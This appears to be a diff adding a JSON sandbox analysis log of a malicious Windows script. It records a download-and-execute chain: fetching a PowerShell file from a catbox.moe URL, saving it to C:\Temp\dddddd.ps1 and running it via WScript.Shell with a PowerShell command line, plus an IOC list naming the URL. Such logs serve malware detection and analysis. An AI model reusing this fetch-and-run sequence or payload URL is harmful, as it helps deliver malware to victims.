@@ -1,0 +1,95 @@
+{
+  "events": [
+    {
+      "sequence": 1,
+      "level": "INFO",
+      "message": "[PROFILE] Elevated WSH context enabled (synthetic /elevate argument)"
+    },
+    {
+      "sequence": 2,
+      "level": "INFO",
+      "message": "[RUN] Executing script (2236 bytes)"
+    },
+    {
+      "sequence": 3,
+      "level": "INFO",
+      "message": "[ANALYSIS] Decoded network indicators"
+    },
+    {
+      "sequence": 4,
+      "level": "INFO",
+      "message": "  URL: https://files.catbox.moe/4ira40.ps1"
+    },
+    {
+      "sequence": 5,
+      "level": "INFO",
+      "message": "[ActiveXObject] WScript.Shell"
+    },
+    {
+      "sequence": 6,
+      "level": "INFO",
+      "message": "[ActiveXObject] Scripting.FileSystemObject"
+    },
+    {
+      "sequence": 7,
+      "level": "INFO",
+      "message": "[ActiveXObject] MSXML2.XMLHTTP"
+    },
+    {
+      "sequence": 8,
+      "level": "INFO",
+      "message": "[FOLDER EXISTS] C:\\Temp => false"
+    },
+    {
+      "sequence": 9,
+      "level": "INFO",
+      "message": "[FSO] CreateFolder: C:\\Temp"
+    },
+    {
+      "sequence": 10,
+      "level": "INFO",
+      "message": "[HTTP OPEN] GET https://files.catbox.moe/4ira40.ps1"
+    },
+    {
+      "sequence": 11,
+      "level": "INFO",
+      "message": "[HTTP SEND] https://files.catbox.moe/4ira40.ps1 => 200"
+    },
+    {
+      "sequence": 12,
+      "level": "INFO",
+      "message": "[CREATE TEXT FILE] C:\\Temp\\dddddd.ps1"
+    },
+    {
+      "sequence": 13,
+      "level": "INFO",
+      "message": "[FILE WRITE] C:\\Temp\\dddddd.ps1 (0 bytes)"
+    },
+    {
+      "sequence": 14,
+      "level": "INFO",
+      "message": "[FILE] Close: C:\\Temp\\dddddd.ps1"
+    },
+    {
+      "sequence": 15,
+      "level": "INFO",
+      "message": "[PROCESS] WScript.Shell.Run\n  executable: PowerShell\n  command: PowerShell -NoProfile -ExecutionPolicy RemoteSigned -File \"C:\\Temp\\dddddd.ps1\"\n  wait: yes"
+    },
+    {
+      "sequence": 16,
+      "level": "INFO",
+      "message": "[ARTIFACTS] Created files"
+    },
+    {
+      "sequence": 17,
+      "level": "INFO",
+      "message": "c:/temp/dddddd.ps1 (0 bytes)"
+    }
+  ],
+  "IOC": {
+    "domains": [
+      "https://files.catbox.moe/4ira40.ps1"
+    ],
+    "ips": []
+  }
+}
